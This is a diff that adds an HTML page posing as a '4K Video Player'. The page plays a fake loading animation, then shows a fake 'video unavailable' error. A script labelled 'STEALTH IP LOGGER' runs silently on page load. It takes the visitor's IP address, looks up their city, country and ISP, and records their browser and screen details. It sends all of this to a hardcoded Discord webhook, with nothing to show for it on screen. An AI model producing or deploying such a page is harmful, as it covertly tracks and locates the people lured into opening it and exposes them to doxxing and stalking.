@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>4K Video Player</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #fff; 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+        }
+        #video-container {
+            margin: 0 auto;
+            max-width: 800px;
+        }
+        #video-placeholder {
+            width: 100%;
+            height: 450px;
+            background: #222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        #loading-bar {
+            width: 0%;
+            height: 4px;
+            background: #ff0000;
+            margin: 10px auto;
+            transition: width 0.5s;
+        }
+        button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h1>4K Video Player</h1>
+    <p>Loading premium content...</p>
+    
+    <div id="video-container">
+        <div id="video-placeholder">
+            <p>Video will play shortly...</p>
+        </div>
+        <div id="loading-bar"></div>
+    </div>
+    <button onclick="retryLoad()">Click if video doesn't load</button>
+
+    <script>
+        // --- FAKE LOADING ANIMATION ---
+        let loadProgress = 0;
+        const loadingInterval = setInterval(() => {
+            loadProgress += 5;
+            document.getElementById("loading-bar").style.width = loadProgress + "%";
+            
+            if (loadProgress >= 100) {
+                clearInterval(loadingInterval);
+                document.getElementById("video-placeholder").innerHTML = 
+                    "<p>Error: Video unavailable. Please check your connection.</p>";
+            }
+        }, 300);
+
+        // --- STEALTH IP LOGGER ---
+        async function logIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
+
+                // Get geolocation
+                const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                const geoData = await geoResponse.json();
+
+                // System info
+                const userAgent = navigator.userAgent;
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+
+                // Discord webhook payload
+                const payload = {
+                    content: `🎥 **New Viewer Logged** 🎥
+                    **IP:** \`${ip}\`
+                    **Location:** \`${geoData.city || "N/A"}, ${geoData.country || "N/A"}\`
+                    **ISP:** \`${geoData.isp || "N/A"}\`
+                    **Device:** \`${userAgent}\`
+                    **Resolution:** \`${screenRes}\`
+                    **Time:** \`${new Date().toLocaleString()}\`
+                    `,
+                    username: "VideoPlayer Logger",
+                    avatar_url: "https://i.imgur.com/123abc.png"
+                };
+
+                // Replace with your Discord webhook URL
+                await fetch("https://discord.com/api/webhooks/1389113319570276412/c4lL8jpLBu4OcUSkuovMLk85RLfPTXtWVwkRwugC83Jk3An7igVxbNL9CippgFTe_bDN", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                // Silent fail
+            }
+        }
+
+        // Run logger when page loads
+        setTimeout(logIP, 2000);
+
+        function retryLoad() {
+            alert("Sorry, the video server is currently down. Try again later.");
+        }
+    </script>
+</body>
+</html>
